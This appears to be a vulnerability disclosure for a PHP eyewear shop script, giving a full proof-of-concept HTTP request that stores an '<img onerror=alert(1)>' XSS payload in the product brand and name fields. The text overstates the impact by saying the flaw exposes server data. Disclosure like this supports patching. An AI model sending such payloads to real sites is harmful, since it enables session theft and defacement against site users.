## Online optical shop website has XSS vulnerability

## Affected version: 
Online Eyewear Shop Website - 1.0

## Software:
https://www.sourcecodester.com/php/16089/online-eyewear-shop-website-using-php-and-mysql-free-download.html

## Vulnerability File:
/oews/classes/Master.php?f=save_product

## Description:
The online eyewear store website 1.0 has an XSS attack in /oews/classes/Master.php?f=save_product. The attack parameter is brand. An attacker can exploit this vulnerability to directly obtain sensitive information from the server.

Status: Moderate

POC
```
POST /oews/classes/Master.php?f=save_product HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------131405002413969045363430851847
Content-Length: 1195
Origin: http://localhost
Connection: close
Referer: http://localhost/oews/admin/?page=products/manage_product&id=1
Cookie: PHPSESSID=e8a2fnat0qfqfbb3m0uv0i8sgc
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

-----------------------------131405002413969045363430851847
Content-Disposition: form-data; name="id"

1
-----------------------------131405002413969045363430851847
Content-Disposition: form-data; name="brand"

## Brand 101<img src=1 onerror=alert(1)>
-----------------------------131405002413969045363430851847
Content-Disposition: form-data; name="name"

Sunglasses 101<img src=1 onerror=alert(1)>
-----------------------------131405002413969045363430851847
Content-Disposition: form-data; name="category_id"

2
-----------------------------131405002413969045363430851847
Content-Disposition: form-data; name="description"

Lorem ipsum dolor sit amet, consectetur adipiscing elit. Mauris vulputate vestibulum massa, eget ultricies nisi cursus quis.
-----------------------------131405002413969045363430851847
Content-Disposition: form-data; name="price"

355.99
-----------------------------131405002413969045363430851847
Content-Disposition: form-data; name="status"

1
-----------------------------131405002413969045363430851847
Content-Disposition: form-data; name="img"; filename=""
Content-Type: application/octet-stream


-----------------------------131405002413969045363430851847--
```

```
Through <img src=1 onerror=alert(1)>, a pop-up window can be directly triggered, and it is a stored XSS
```
![CleanShot 2025-04-03 at 12 38 11@2x](https://github.com/user-attachments/assets/00ce1b0d-17cb-488e-99bb-58efe26f5bd9)


